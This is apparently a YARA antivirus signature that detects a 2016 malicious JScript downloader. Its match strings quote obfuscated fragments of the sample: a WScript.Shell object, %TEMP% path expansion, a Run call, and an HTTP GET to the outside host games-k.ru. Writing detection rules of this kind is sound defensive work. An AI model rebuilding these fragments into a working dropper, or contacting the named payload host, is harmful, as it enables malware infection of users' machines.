rule sig_20160427_a7af66d19864228b477c784cbdba00e1 {
  meta:
    description = "datamaliciousorder - file 20160427_a7af66d19864228b477c784cbdba00e1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7439a285e18bbc19296ab9d06a2f1fd5859e8b828a3301a15f8fe43761d65a7c"

  strings:
    $s1  = "function PlmemSjfqb() {return AzpwlLcxya[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"13EubKR" ascii
    $s2  = "function PlmemSjfqb() {return AzpwlLcxya[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"13EubKR" ascii
    $s3  = "function JiojuFyzdp(YsijzYjdnj, ElixqUynmo){GpxetZdlyc = GpxetZdlyc * 1; return YsijzYjdnj - ElixqUynmo;};" fullword ascii
    $s4  = "var AzpwlLcxya = function TgywuHusdc() {return CiovuVidlt[NmbbyIqkvu](\"WScript\"+\".Shell\");}(), FodzjAiint = 11;" fullword ascii
    $s5  = "SoybyHluxw[CuzmwZsabd](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var CiovuVidlt = this[\"WScript\"];" fullword ascii
    $s7  = "function CjuhwRikls(){return JfkzaEghbh + \"\";};" fullword ascii
    $s8  = "if (SoybyHluxw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function XfhxbLofsu() {return ((CesusCwmtk == true) && (CesusCwmtk == GvhlmLdpcv)) ? 1 : GpxetZdlyc;};" fullword ascii
    $s10 = "var GvhlmLdpcv = false;" fullword ascii
    $s11 = "CesusCwmtk = true; " fullword ascii
    $s12 = "function LjippQxwsd(){return 23;};" fullword ascii
    $s13 = "var CesusCwmtk = false;" fullword ascii
    $s14 = "GvhlmLdpcv = true; " fullword ascii
    $s15 = "function UwjjeHdylj(HsnmeHauip){AzpwlLcxya[\"R\"+\"un\"](HsnmeHauip, GpxetZdlyc, GpxetZdlyc);};" fullword ascii
    $s16 = "var UkwawQwixi = false;" fullword ascii
    $s17 = "function HerjjIsvoi(){return NmbbyIqkvu;};" fullword ascii
    $s18 = "UkwawQwixi = true;" fullword ascii
    $s19 = "function UxqqaYgmdq()" fullword ascii
    $s20 = "return JiojuFyzdp(YslfxCubvj, IqqhmBpvan);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}